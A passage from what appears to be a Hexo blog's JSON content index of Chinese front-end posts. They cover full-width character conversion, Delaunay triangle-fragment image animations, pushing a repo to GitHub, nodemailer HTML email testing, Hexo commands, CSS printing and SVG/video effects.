\\u2a17\\u2a22-\\u2a27\\u2a29\\u2a2a\\u2a2d-\\u2a31\\u2a33-\\u2a3c\\u2a3f\\u2a40\\u2a42-\\u2a4d\\u2a50\\u2a53-\\u2a58\\u2a5a-\\u2a5d\\u2a5f\\u2a66\\u2a6a\\u2a6d-\\u2a75\\u2a77-\\u2a9a\\u2a9d-\\u2aa2\\u2aa4-\\u2ab0\\u2ab3-\\u2ac8\\u2acb\\u2acc\\u2acf-\\u2adb\\u2ae4\\u2ae6-\\u2ae9\\u2aeb-\\u2af3\\u2afd\\ufb00-\\ufb04]/g;\n\n        var $input = $(ele),\n            $container = $input.parents('.J-x2en-contianer').length > 0 ? $input.parents('.J-x2en-contianer') : $input.parents('.form-item'),\n            $autoEnExtra = $container.find('.J-x2en-feedback'),\n            $tip = $autoEnExtra.find('.J-m-tip');\n        // 中文符号及其他全角符号转成英文及半角符号，规则同富文本\n        var CnToEn = function (cdata) {\n            var replaceString = new Array(/｀/g, \"`\", /～/g, \"~\", /！/g, \"!\", /＃/g, \"#\", /＄/g, \"$\", /％/g, \"%\", /（/g, \"(\", /）/g, \")\", /“/g, \"\\\"\", /”/g, \"\\\"\", /；/g, \";\", /：/g, \":\", /，/g, \",\", /。|．/g, \".\", /？/g, \"?\", / /g, \" \", /＇/g, \"'\", /‘/g, \"'\", /’/g, \"'\", /／/g, \"/\", /＂/g, \"\\\"\", /＜/g, \"<\", /＞/g, \">\", /＊/g, \"*\", /＆/g, \"&\", /＠/g, \"@\", /＾/g, \"^\", /＋/g, \"+\", /｜/g, \"|\", /＼/g, \"\\\\\", /．/g, \".\", /＿/g, \"_\", /＝/g, \"=\", /－/g, \"-\", /……/g, \"...\", /１/g, \"1\", /２/g, \"2\", /３/g, \"3\", /４/g, \"4\", /５/g, \"5\", /６/g, \"6\", /７/g, \"7\", /８/g, \"8\", /９/g, \"9\", /０/g, \"0\", /、/g, \",\", /｛/g, \"{\", /｝/g, \"}\", /［/g, \"[\", /］/g, \"]\", /Ａ/g, \"A\", /Ｂ/g, \"B\", /Ｃ/g, \"C\", /Ｄ/g, \"D\", /Ｅ/g, \"E\", /Ｆ/g, \"F\", /Ｇ/g, \"G\", /Ｈ/g, \"H\", /Ｉ/g, \"I\", /Ｊ/g, \"J\", /Ｋ/g, \"K\", /Ｌ/g, \"L\", /Ｍ/g, \"M\", /Ｎ/g, \"N\", /Ｏ/g, \"O\", /Ｐ/g, \"P\", /Ｑ/g, \"Q\", /Ｒ/g, \"R\", /Ｓ/g, \"S\", /Ｔ/g, \"T\", /Ｕ/g, \"U\", /Ｖ/g, \"V\", /Ｗ/g, \"W\", /Ｘ/g, \"X\", /Ｙ/g, \"Y\", /Ｚ/g, \"Z\", /ａ/g, \"a\", /ｂ/g, \"b\", /ｃ/g, \"c\", /ｄ/g, \"d\", /ｅ/g, \"e\", /ｆ/g, \"f\", /ｇ/g, \"g\", /ｈ/g, \"h\", /ｉ/g, \"i\", /ｊ/g, \"j\", /ｋ/g, \"k\", /ｌ/g, \"l\", /ｍ/g, \"m\", /ｎ/g, \"n\", /ｏ/g, \"o\", /ｐ/g, \"p\", /ｑ/g, \"q\", /ｒ/g, \"r\", /ｓ/g, \"s\", /ｔ/g, \"t\", /ｕ/g, \"u\", /ｖ/g, \"v\", /ｗ/g, \"w\", /ｘ/g, \"x\", /ｙ/g, \"y\", /ｚ/g, \"z\",/—/g,\"-\",/–/g,\"-\");\n            for (i = 0; i < replaceString.length; i = i + 2) {\n                cdata = cdata.replace(replaceString[i], replaceString[i + 1]);\n            }\n            return cdata;\n        };\n\n        var result = CnToEn(val);\n        $(ele).val(result);\n\n        if(reg.test(result)) {\n            $autoEnExtra.on('click', '.J-show-btn', function(){\n                $tip.show();\n            });\n            $autoEnExtra.on('click', '.J-confirm-btn', function(){\n                result = result.replace(reg, '');\n                $(ele).val(result).valid();\n                $tip.hide();\n            });\n            $autoEnExtra.on('click', '.J-cancel-btn', function(){\n                $tip.hide();\n            });\n            $autoEnExtra.show();\n            return false;\n        }else {\n            $autoEnExtra.hide();\n            return true;\n        }\n\n    });\n```\n\n# 后记\n","tags":["实战"],"categories":["其他"]},{"title":"三角碎片动效（五）——焦点图轮播示例","url":"%2F2018-2018-08-07-delaunay-5%2F","content":"# 前言\n接着上一篇[三角碎片动效（四）——生成动画](/2018/08/07/delaunay-4/)，这篇讲下具体应用示例：焦点图轮播。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n# 概述\n关于焦点图轮播，大家是最常见到的，也是有大量资源的，例如网页端使用广泛的[swiper](https://www.swiper.com.cn/)。本篇也是实现这样的图片切换，只不过过渡动画是用三角剖分实现的三角碎片动画。\n## 效果展示\n![效果展示](GIF.gif)\n<!-- more -->\n# 详述\n## 实现代码\n```\nvar imgWidth = 0,\n    imgHeight = 0,\n    xSubNum = 6, //宽度分段数量\n    ySubNum = 5, //高度分段数量\n    offsetRatio = 0.5;\n\n\nvar container = document.getElementById('container');\n\nvar sourceArray = [\n    \"images/1.jpg\",\n    \"images/2.jpg\",\n    \"images/3.jpg\",\n    \"images/4.jpg\"\n];\nvar index = 0;\npreloadImg(sourceArray,function(images){\n    slide(images);\n})\n\n// 执行动画\nfunction slide(images) {\n    var image = images[index];\n    imgWidth = image.width;\n    imgHeight = image.height;\n\n    var vertices = getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio);\n    var fragments = getFragments(vertices, image);\n    \n    \n    TweenMax.set(container, {\n        perspective: 500\n    });\n\n\n    var cvsArray = [];\n    fragments.forEach(function (element, index) {\n        var fragmentCvs = element.canvas;\n        cvsArray.push(fragmentCvs);\n        container.appendChild(fragmentCvs);\n    })\n\n    TweenMax.staggerFromTo(cvsArray, 0.2, {\n        opacity: 0,\n        z: 100,\n        scale: 2\n    }, {\n        opacity: 1,\n        z: 0,\n        scale: 1\n    }, 0.05, function(){\n        // 完成一幅后切换下一幅\n        container.innerHTML = '';\n        index === sourceArray.length-1 ? index = 0 : index++;\n        slide(images);\n    });\n}\n```\n# 后记\n大家也看到了，这只是一个示例，动画效果很粗糙，如果要实际使用还需要做很多工作。\n\n这也是我接下来要做的：\n\n1，碎片动画完成后增加完整图片的显示（没有裂纹效果）；\n\n2，性能优化，增加缓存，减少dom操作；\n\n3，细节优化，打包；\n\n4，完成一个标准的焦点图轮播组件。","tags":["canvas"],"categories":["前端"]},{"title":"三角碎片动效（四）——生成动画","url":"%2F2018-2018-08-07-delaunay-4%2F","content":"# 前言\n接着上一篇[三角碎片动效（三）——get fragments](/2018/08/06/delaunay-3/)，这篇讲下生成碎片fragments后，怎样生成动画。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n# 概述\n关于动画，我之前也有介绍过[JS动画（一）——定时器详解](/2018/04/09/JS动画之定时器详解/)，其实现在各种场景都在或多或少的使用，入场动画动画一般会直接用css3，有一定逻辑的系列动画一般会用jquery animate或者一些流行的js动画库，例如非常流行强大的[GSAP](https://greensock.com/gsap)动画平台，或者Adobe家族的createJS，还有其他一些轻量的针对特定场景的，如svg，canvas，webgl的动画框架。这篇只作整个流程，动画部分与其他部分衔接介绍，因为对于动画部分也是相对独立的模块，不过是选用一种技术，实现大量dom的过渡动画。\n## 效果展示\n![效果展示](1.gif)\n<!-- more -->\n# 详述\n## 实现代码\n```\nvar imgWidth = 0,\n    imgHeight = 0,\n    xSubNum = 12, //宽度分段数量\n    ySubNum = 12, //高度分段数量\n    offsetRatio = 0.5;\n\n\nvar container = document.getElementById('container');\nvar source = 'images/1.jpg';\n\nwindow.onload = function () {\n\n    var image = new Image();\n    image.onload = function () {\n        \n        play(image);\n    }\n    image.src = source;\n\n};\n\n// 执行动画\nfunction play(image) {\n\n    imgWidth = image.width;\n    imgHeight = image.height;\n\n    var vertices = getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio);\n    var fragments = getFragments(vertices, image);\n\n    for (var i = 0; i < fragments.length; i++) {\n        var fragmentCvs = fragments[i].canvas;\n\n        container.appendChild(fragmentCvs);\n\n        TweenMax.fromTo(fragmentCvs, 1, {\n            y: -fragmentCvs.height,\n            opacity: 0\n        }, {\n            y: 0,\n            opacity: 1,\n            ease: Power1.easeInOut\n        })\n\n    }\n\n}\n```\n# 后记\n本示例是使用GSAP动画平台实现的动画，大家可以根据自己喜好选用动画实现技术，无非就是把生成的碎片fragments（一个个canvas元素）有序的放到页面中。","tags":["canvas"],"categories":["前端"]},{"title":"三角碎片动效（三）——get fragments","url":"%2F2018-2018-08-06-delaunay-3%2F","content":"# 前言\n接着上一篇[三角碎片动效（二）——get vertices](/2018/08/06/delaunay-2/)，这篇讲下两个核心之一生成碎片集（getFragments）。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n\n# 概述\n有了端点集vertices就可以调用delaunay.js的方法生成三角点集triangles，正如第一篇里讲到的，这个值是一个需要绘制三角的端点索引集，每三个值对应vertices中的三个端点，然后就是运用canvas知识生成图片碎片集fragments。\n## 效果展示\n![效果展示](1.jpg)\n\n<!-- more -->\n# 详述\n## 实现代码\n```\nfunction getFragments(vertices, image) {\n  var triangles = Delaunay.triangulate(vertices);\n\n  var fragments = [];\n\n  for (var i = 0; i < triangles.length; i += 3) {\n    var v0 = vertices[triangles[i + 0]];\n    var v1 = vertices[triangles[i + 1]];\n    var v2 = vertices[triangles[i + 2]];\n\n    var xMin = Math.min(v0[0], v1[0], v2[0]),\n      xMax = Math.max(v0[0], v1[0], v2[0]),\n      yMin = Math.min(v0[1], v1[1], v2[1]),\n      yMax = Math.max(v0[1], v1[1], v2[1]);\n\n    var box = {\n      x: Math.round(xMin),\n      y: Math.round(yMin),\n      w: Math.round(xMax - xMin),\n      h: Math.round(yMax - yMin)\n    };\n\n\n    var canvas = document.createElement('canvas');\n    canvas.width = box.w;\n    canvas.height = box.h;\n    canvas.style.width = box.w + 'px';\n    canvas.style.height = box.h + 'px';\n    canvas.style.left = box.x + 'px';\n    canvas.style.top = box.y + 'px';\n    var ctx = canvas.getContext('2d');\n\n    ctx.translate(-box.x, -box.y);\n    ctx.beginPath();\n    ctx.moveTo(v0[0], v0[1]);\n    ctx.lineTo(v1[0], v1[1]);\n    ctx.lineTo(v2[0], v2[1]);\n    ctx.closePath();\n    ctx.clip();\n    ctx.drawImage(image, 0, 0);\n\n\n\n    var fragment = {\n      canvas: canvas,\n      box: box\n    };\n\n    fragments.push(fragment);\n\n  }\n  return fragments;\n}\n```\n## 参数说明\nvertices：端点集；\nimage：图片对象，canvas的方法`drawImage`使用；\n\n# 后记\n这部分主要是canvas的使用，因为属于独立知识，因此不熟悉的请先学习下canvas的api。","tags":["canvas"],"categories":["前端"]},{"title":"三角碎片动效（二）——get vertices","url":"%2F2018-2018-08-06-delaunay-2%2F","content":"# 前言\n接着上一篇[三角碎片动效（一）——认识delaunay.js](/2018/08/01/delaunay-1/)，这篇讲下两个核心之一生成端点集（getVertices）。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n\n# 概述\n生成端点集的算法有很多种，我这里是参考网上整理的一种。这个功能块很重要，下一步的三角剖分就是根据这个值来的，这个端点集直接影响的就是整张图的分割效果（数量，大小，边界等）。\n## 效果展示\n![效果展示](1.jpg)\n\n<!-- more -->\n# 详述\n## 实现代码\n```\nfunction getVertices(imgWidth, imgHeight, xSubNum, ySubNum, offsetRatio) {\n  var xSub = imgWidth / xSubNum,\n    ySub = imgHeight / ySubNum;\n  var vertices = [];\n  for (var i = 0; i <= xSubNum; i++) {\n    for (var j = 0; j <= ySubNum; j++) {\n      var x = 0;\n      if (i == 0) {\n        x = 0\n      } else if (i == xSubNum) {\n        x = imgWidth;\n      } else {\n        x = i * xSub + randomRange(-xSub * offsetRatio, xSub * offsetRatio);\n      }\n\n      var y = 0;\n      if (j == 0) {\n        y = 0\n      } else if (j == ySubNum) {\n        y = imgHeight;\n      } else {\n        y = j * ySub + randomRange(-ySub * offsetRatio, ySub * offsetRatio);\n      }\n\n      vertices.push([x, y]);\n    }\n  }\n  return vertices;\n}\n```\n## 参数说明\nimgWidth,imgHeight：图片的原始宽高；\nxSubNum,ySubNum：横向与纵向分割碎片的数量；\noffsetRatio：每个碎片随机增减幅度比例；\n\n# 备注\n这个代码很糙，后期优化，提供配置生成各种端点，例如规则的，不规则的，给定数量，大小渐进，从内向外，从任意一遍到另一边等。","tags":["JavaScript"],"categories":["前端"]},{"title":"三角碎片动效（一）——认识delaunay.js","url":"%2F2018-2018-08-01-delaunay-1%2F","content":"# 前言\n网上看到一种图片播放的效果，类似玻璃片碎裂，于是深究下去，发现源头来自一个国外的示例，核心是用了一个开源的三角剖分算法的js库——[delaunay.js](https://github.com/ironwallaby/delaunay)。因为之前没接触过，因此从零开始好好学习了下，在此记录下学习心得。[源码](https://github.com/jovysun/WOW/tree/master/delaunay)\n\n# 概述\n从我们动效应用层面的理解是，在一个平面内，产生有限的点集，根据算法，划分成若干个三角面，这些三角面的合集是散点集的凸包。具体详细的理论知识有兴趣的可以深究下去：[三角剖分](https://baike.baidu.com/item/%E4%B8%89%E8%A7%92%E5%89%96%E5%88%86/10390049?fr=aladdin)，[Delaunay三角剖分算法](https://baike.baidu.com/item/Delaunay%E4%B8%89%E8%A7%92%E5%89%96%E5%88%86%E7%AE%97%E6%B3%95/3779918)，[凸包](https://baike.baidu.com/item/%E5%87%B8%E5%8C%85)。\n## 效果展示\n![应用效果展示](preview.gif)\n\n<!-- more -->\n# 详述\n对于delaunay.js，官方没有接口文档，只给了一个示例：\n```\n      var canvas = document.getElementById(\"canvas\"),\n          ctx = canvas.getContext(\"2d\"),\n          vertices = new Array(4),\n          i, x, y;\n\n      for(i = vertices.length; i--; ) {\n        do {\n          x = Math.random() - 0.5;\n          y = Math.random() - 0.5;\n        } while(x * x + y * y > 0.25);\n\n        x = (x * 0.96875 + 0.5) * canvas.width;\n        y = (y * 0.96875 + 0.5) * canvas.height;\n\n        vertices[i] = [x, y];\n      }\n      console.log(vertices);\n      console.time(\"triangulate\");\n      var triangles = Delaunay.triangulate(vertices);\n      console.log(triangles);\n      console.timeEnd(\"triangulate\");\n\n      for(i = triangles.length; i; ) {\n        ctx.beginPath();\n        --i; ctx.moveTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);\n        --i; ctx.lineTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);\n        --i; ctx.lineTo(vertices[triangles[i]][0], vertices[triangles[i]][1]);\n        ctx.closePath();\n        ctx.stroke();\n      }\n```\n上半部分是获得点集vertices，下半部分是根据算出的三角端点绘制图形，重点就是中间的一行代码`var triangles = Delaunay.triangulate(vertices);`，这个就是调用接口，传入端点集生成三角端点索引。多说一句，vertices是二维数组表示的端点集，triangles是需要依次绘制的三角形的端点索引值。\n## 绘图展示\n三个点，一个三角面，四个点，两个三角面，如下图：\n![四点两面](delaunay3.jpg)\n但是细想下发现，四个点，可能三个三角面，如下图：\n![四点三面](delaunay4.jpg)\n## 数据展示\n四个点，两个三角面，如下图：\n![四点两面](delaunay1.jpg)\n![四点两面](delaunay5.jpg)\n四个点，三个三角面，如下图：\n![四点三面](delaunay2.jpg)\n![四点两面](delaunay6.jpg)\n## 更多点展示\n[delaunay算法在线展示](https://travellermap.com/tmp/delaunay.htm)\n\n这篇主要讲下三角剖分的概念及delaunay.js的理解和使用，下一篇将讲下具体的图片三角切分。\n# 备注\n[国内整理者](http://www.html5-css3.cn/article/9438)\n\n[原作者主页](https://zachsaucier.com/)\n\n[codepen效果展示](https://codepen.io/Zeaklous/pen/raltF)\n","tags":["JavaScript"],"categories":["前端"]},{"title":"本地库上传到github","url":"%2F2018-2018-07-25-repo-to-github%2F","content":"\n# 前言\n网络资源，笔记备忘。\n\n# 概述\n```\n$ git remote add origin git@github.com:yourName/yourRepo.git\n$ git pull origin master\n$ git add .\n$ git commit -m \"first commit\" \n$ git push origin master  \n\n```\n<!-- more -->\n# 详述\n\n1、首先在本地创建ssh key；\n\n$ ssh-keygen -t rsa -C \"your_email@youremail.com\"  \n\n后面的your_email@youremail.com改为你的邮箱，之后会要求确认路径和输入密码，我们这使用默认的一路回车就行。成功的话会在~/下生成.ssh文件夹，进去，打开id_rsa.pub，复制里面的key。\n\n2、回到github，进入Account Settings，左边选择SSH Keys，Add SSH Key,title随便填，粘贴key。为了验证是否成功，在Git bash下输入：\n\n$ ssh -T git@github.com  \n\n如果是第一次的会提示是否continue，输入yes就会看到：You’ve successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。\n\n3、接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们。\n\n    $ git config --global user.name \"your name\"  \n    $ git config --global user.email \"your_email@youremail.com\"  \n\n进入要上传的仓库，右键git bash，添加远程地址：\n\n    $ git remote add origin git@github.com:yourName/yourRepo.git  (可以去git上复制仓库的地址)\n\n4.提交、上传\n\n接下来在本地仓库里添加一些文件，比如README，\n\n    $ git add README  \n    $ git commit -m \"first commit\" \n\n上传到github：\n\n    $ git push origin master  \n\ngit push命令会将本地仓库推送到远程服务器。\ngit pull命令则相反。\n\n[注意]：如果origin已经存在了，请使用  git remote rm origin ，然后再add origin 即可。\n\n# 备注\n来源：https://blog.csdn.net/bj123467/article/details/52981009","tags":["git"],"categories":["其他"]},{"title":"html邮件模板测试及nodemailer的入门","url":"%2F2018-2018-07-25-nodemailer%2F","content":"\n# 前言\n项目中客户往来需要定制邮件模板，前端开发完后需要测试，简单的可以直接浏览html文件，但是各种邮件终端解析有些异同，因此需要用真实的各个终端进行测试，这就需要我们搭建一个简单邮件发送功能。业务需求是实现html模板的测试，对于nodemailer其他功能只作入门简介，具体可根据实际需要深究。\n\n# 概述\n## 示例效果图：\n![html模板](emailTemplate.jpg)\n![ejs模板](emailEjs.jpg)\n<!-- more -->\n\n# 详述\n## nodemailer简介\n+ 是什么，Node.js应用的邮件发送模块；\n+ 环境要求Node.js v6+；\n+ 安装`npm install nodemailer --save`\n+ 官方入门示例代码：\n```\n'use strict';\nconst nodemailer = require('nodemailer');\n\n// Generate test SMTP service account from ethereal.email\n// Only needed if you don't have a real mail account for testing\nnodemailer.createTestAccount((err, account) => {\n    // create reusable transporter object using the default SMTP transport\n    let transporter = nodemailer.createTransport({\n        host: 'smtp.ethereal.email',\n        port: 587,\n        secure: false, // true for 465, false for other ports\n        auth: {\n            user: account.user, // generated ethereal user\n            pass: account.pass // generated ethereal password\n        }\n    });\n\n    // setup email data with unicode symbols\n    let mailOptions = {\n        from: '\"Fred Foo 👻\" <foo@example.com>', // sender address\n        to: 'bar@example.com, baz@example.com', // list of receivers\n        subject: 'Hello ✔', // Subject line\n        text: 'Hello world?', // plain text body\n        html: '<b>Hello world?</b>' // html body\n    };\n\n    // send mail with defined transport object\n    transporter.sendMail(mailOptions, (error, info) => {\n        if (error) {\n            return console.log(error);\n        }\n        console.log('Message sent: %s', info.messageId);\n        // Preview only available when sending through an Ethereal account\n        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));\n\n        // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>\n        // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...\n    });\n});\n\n```\n这个是ethereal.email邮件测试账户的示例，我们重点看下代码，主要是三个部分：transporter，mailOptions，sendMail。\n\n首先，需要创建一个transporter实例对象，具体参数就像我们在邮件终端如foxmail中配置账户一样，需要注意的是pass，不是登录密码，而是授权码。（163邮箱的话，要开启POP3/SMTP服务，在设置 --> POP3/SMTP/IMAP页面，设置。开通后会有个授权码的，配置里的密码，就是用这个授权码；qq邮箱的话，同样也要开启这个服务，设置 --> 账户 --> POP3服务，点击开启，就会有个授权码，如果忘了记录，在开启服务下面有个“生成授权码”的，可以获取到的。）\n\n其次，设置发送相关参数，这个与日常发邮件填写的参数一样，重点看下html参数，及示例没提到的attachments参数。html参数是邮件主题内容，值可以是html字符串，也可以是数据流，这个稍后使用实例再介绍；\n\n最后，调用transporter实例的sendMail方法，可以在回调函数中处理成功失败相关业务逻辑。\n\n## 实例简介：\n### 上文提到mailOptions中的html参数值可以是数据流，具体代码如下：\n```\n// 内容来自html文件\nconst htmlData = fs.readFileSync('email/template.html','utf-8');\n\n// 内容来自ejs模板\nconst template = ejs.compile(fs.readFileSync(path.resolve(__dirname, 'email/email.ejs'), 'utf8'));\nconst ejsData = template({\n  title: 'Ejs',\n  desc: '使用Ejs渲染模板',\n});\n```\n```\n\tlet mailOptions = {\n\t\tfrom: '\"sun\" <'+ config.user+'>', // sender address\n\t\tto: '\"sun\" <xxxx@qq.com>, xxxx@xxxx.com', // list of receivers\n\t\tsubject: 'nodemailer测试demo', // Subject line\n\t\t// text: 'Hello', // plain text body\n\t\t// html: ejsData, // 内容来自ejs模板\n\t\thtml: htmlData, // 内容来自html文件\n\t\tattachments: [\n\t\t\t{   // utf-8 string as an attachment\n\t\t\t\tfilename: 'text1.txt',\n\t\t\t\tpath: path.resolve(__dirname, 'attachments/text.txt')\n\t\t\t},\n\t\t\t{   // utf-8 string as an attachment\n\t\t\t\tfilename: 'text2.txt',\n\t\t\t\tcontent: 'i am text2.txt'\n\t\t\t},\n\t\t\t{\n\t\t\t\tfilename: '蚂蚁头像.jpg',\n\t\t\t\tpath: path.resolve(__dirname, 'attachments/mayi.jpg'),\n\t\t\t\tcid: 'mayi.jpg'\n\t\t\t},\n\t\t\t{\n\t\t\t\tfilename: '二维码',\n\t\t\t\tpath: path.resolve(__dirname, 'attachments/canvas.png'),\n\t\t\t\tcid: 'qrcode'\n\t\t\t}\n\t\t]\n\t};\n```\n### 几个点强调下：\n+ 对于常见的邮件服务商可以用service替换host配置，具体支持情况见[service列表](https://nodemailer.com/smtp/well-known/)。\n```\nlet transporter = nodemailer.createTransport({\n     service: 'QQ', // no need to set host or port etc.\n     auth: {\n         user: 'account.email@example.com',\n         pass: 'smtp-password'\n     }\n});\n\ntransporter.sendMail(...)\n\n```\n+ attachments的使用，除了正常的添加附件外，还可以定义`cid`作为内容的引用源，附件配置见上文mailOptions示例代码，具体内容中使用如下：\n```\n<img src=\"cid:qrcode\" alt=\"\" title=\"\">\n```\n+ [源代码](https://github.com/jovysun/sendMail)\n\n\n# 备注\nhttps://segmentfault.com/a/1190000012251328\n\nhttps://nodemailer.com/about/\n","tags":["Node.js"],"categories":["其他"]},{"title":"hexo相关知识整理","url":"%2F2018-2018-07-10-hexo-about%2F","content":"\n# 概述\nhexo写博客工具本身相关的知识整理，备忘。\n<!-- more -->\n\n# 详述\n\n## 常用命令\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n### 合并生成部署\n``` bash\n$ hexo d -g\n```\n### 建立草稿\n\n``` bash\n$ hexo new draft \"My New Draft\"\n```\n### 本机预览\n``` bash\n$ hexo s --draft\n```\n### 草稿发布\n``` bash\n$ hexo p \"My New Draft\"\n```\n### 指定布局模板\n``` bash\n$ hexo new 布局 \"文章名\"\n```\n\n## 博文插入图片\n\n### 1.安装插件\n```bash\nnpm install hexo-asset-image --save\n```\n### 2.修改配置`_config.yml`\n```yml\npost_asset_folder: true\n```\n### 3.使用\n创建博文同时会自动创建一个同名文件夹，把图片素材放入该文件夹，然后就可以在博文中引用了，示例如下：\n![hexo博文插入图片](01.jpg)\n\n\n## 多终端同步主题丢失\n1. 更新`$ git clone https://github.com/theme-next/hexo-theme-next themes/next-reloaded`\n2. 修改：修改对应主题中的`_config.yml`配置\n","tags":["备忘"],"categories":["其他"]},{"title":"网页打印实践及参考资料推荐","url":"%2F2018-print%2F","content":">难度系数：简单\n关键词：css print\n\n# 实践\n处理前截图：\n![图片描述][1]\n处理后截图：\n![图片描述][2]\n## 实践小结\n第一次接到网页要提供打印，可能会有些不知所措，我这里只说下遇到表格、图像、列表项内容在尾部被断开的问题处理。\n1. 方案选用的是直接调用[window.print()](https://developer.mozilla.org/en-US/docs/Web/API/Window/print)方法;\n2. 本次用到的只是处理固定块内容不被截断，对于不想被断开的元素设置css值`page-break-inside: avoid`，例如：\n```\n.vo-cnt-list{\n    li{\n        page-break-inside: avoid;\n    }\n}\n```\n# 备注\n需要了解更详细的，可以参考[ web打印的几种方案 ](https://blog.csdn.net/a89004088/article/details/78362915)和[打印样式设计 ](https://www.w3cplus.com/css/designing-for-print-with-css.html)。\n\n\n  [1]: print1.jpg\n  [2]: print2.jpg","tags":["CSS"],"categories":["前端"]},{"title":"产品条目不在可视区域的处理","url":"%2F2018-selectedInView%2F","content":"> 难度系数：简单\n\n> 关键词：length outerHeight position   \n\n# 前言\n案例很简单，但是对于初学者可以延伸学习下jquery的相关知识点：\n1. 判断选择的元素是否存在用`length`;\n2. 获取元素的高度height()与outerHeight()的异同；\n3. 判断元素位置position()与offset()的异同。\n\n# 应用场景：\n在做动态创建目录的时候，选择的条目不在可视区域，如图：\n![场景图](selectedInView.jpg)\n\n默认情况滚动条都是在最上面的，导致超出可视区域的选择条目没有呈现在可视区域，因此要脚本处理下。代码很简单，如下：\n## 设置父容器相对定位\n```\nul{\n    postion:relative;\n}\n```\n## 动态创建完dom结构后调用函数\n```\nfunction setSelectedInView(){\n    $('.J-item.selected').each(function(){\n        var $this = $(this);\n        if($this.length > 0){\n            var $item = $this.parent(),\n                itemHeight = $item.outerHeight(),\n                itemTop = $item.position().top;\n            var $container = $item.parent('.J-items'),\n                containerHeight = $container.height();\n            // 如果该条目元素相对于父级的位置超出可视框高度，设置滚动条\n            if(itemTop > containerHeight){\n                $container.scrollTop(itemTop - containerHeight + itemHeight);\n            }\n        }\n    })\n}\n```","tags":["JavaScript"],"categories":["前端"]},{"title":"svg与视频结合的镂空效果实践","url":"%2F2019-04-10-svg-video%2F","content":"\n# 概述\n一个是svg的运用，另一个是video在移动端的兼容问题。\n<!-- more -->\n# 详述\n\n## 效果预览\n截图见附录，[在线地址](//special.made-in-china.com/brandPublicty)\n\n## 实现\n思路一，是用png，优点是简单直接，缺点就是非矢量，可能有锯齿，多端需要多张图；\n\n思路二，是用svg，优点是矢量，可以直接用svg标签也可以像图片一样单独引用，缺点就是需要一点学习成本。\n\n显然，这次采用的是思路二，对于svg的本次使用，简单说明下：\n由于是全屏半透明“M”镂空，因此首先想到的是有个直接全屏的svg，但是实际要响应多终端，宽高比都不同，一个全屏的svg是不可行的。怎么办呢？利用snap.svg等js库动态创建是不是可以呢？问题是很多时候镂空的图案是特殊的设计图案，一般的程序员想去直接绘制也不太可行。\n\n最后实现是设计师提供一个\"M\"svg文件，咱们根据屏幕大小实时的补全上边左边右边部分。\n\n对于svg的使用可以单独引用文件也可以嵌入HTML中。\n\n### 单独引用方法有如下这些：\n```html\n<embed src=\"xxx.svg\" type=\"image/svg+xml\" /> \n```\n```html\n<object data=\"xxx.svg\" type=\"image/svg+xml\"></object> \n```\n```html\n<iframe src=\"xxx.svg\"></iframe> \n```\n```html\n<img src=\"xxx.svg\" alt=\"\">\n```\n### 嵌入HTML中方法：\n由于SVG是XML文件，因此可以用任何文本编辑器创建、查看和编辑，当然实际运用中都是用可视化工具创作，例如inkscape、Illustrator等。用文本编辑器打开svg文件，直接复制黏贴到HTML中，然后做些简单的整理可以了。\n```html\n<svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\">\n    <path class=\"st1\" d=\"xxxxxx\"/>\n    ...\n</svg>\n```\n## 移动端video兼容问题\n1，微信内置浏览器自动全屏的问题。\n处理方法是在video标签上加`x5-playsinline=\"\" playsinline=\"\" webkit-playsinline=\"\"`\n```html\n<video src=\"xxx.mp4\" x5-playsinline=\"\" playsinline=\"\" webkit-playsinline=\"\" data-poster=\"xxx.jpg\" preload=\"none\" loop=\"loop\" class=\"media-video\">\n    Your browser does not support the video tag.\n</video>\n```\n2，微信内置浏览器z-index不起作用问题。\n处理方法是在video便签上加`x5-video-player-type=\"h5\"`\n```html\n<video src=\"xxx.mp4\" x5-video-player-type=\"h5\" x5-playsinline=\"\" playsinline=\"\" webkit-playsinline=\"\" data-poster=\"xxx.jpg\" preload=\"none\" loop=\"loop\" class=\"media-video\">\n    Your browser does not support the video tag.\n</video>\n```\n3，实际中还有各种其他问题，例如自动播放属性设置无效，iOS端编码格式要求等，最后因为业务及时间等因素综合考虑，针对移动触屏端改用图片循环播。\n\n## 效果展示：\nPC端：\n\n![品宣专题PC](brandPublicty1.jpg)\n![品宣专题PC](brandPublicty2.jpg)\n\n移动端：\n\n![品宣专题移动](brandPublicty3.jpg) ![品宣专题移动](brandPublicty4.jpg)\n","tags":["动效"],"categories":["前端"]},{"title":"JS动画（二）——缓动函数分析及动画库","url":"%2F2018-JS%E5%8A%A8%E7%94%BB%E4%B9%8B%E7%BC%93%E5%8A%A8%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%E5%8F%8A%E5%8A%A8%E7%94%BB%E5%BA%93%2F","content":"上一篇讲了JS动画定时器相关知识，这一篇介绍下缓动函数及流行的动画库。\n## 熟悉的图 ##\n\n![clipboard.png](easingFunction.png)\n## 实际使用 ##\njquery animate()+[jquery.easing插件][1]的使用：\n\n```\n$(selector).animate(styles,speed,easing,callback)\n```\n原生js使用：\n[张鑫旭同学的文章][2]\n## 缓动函数知识 ##\n什么是缓动函数？我的理解是动画参数与数学公式结合的函数。\n\n各流行库缓动函数对比，以easeInQuad为例，如图：\n\n**[Tween.js][3]**\n\n![clipboard.png](tweenjs.png)\n\n**[jQuery.easing][4]**\n\n![clipboard.png](jqueryEasing.png)\n\n**[GSAP][5]**\n\n![clipboard.png](gsap.png)\n\n**[CreateJS][6]**\n\n![clipboard.png](creatJs.png)\n\n[Kute.js][7]\n```\n  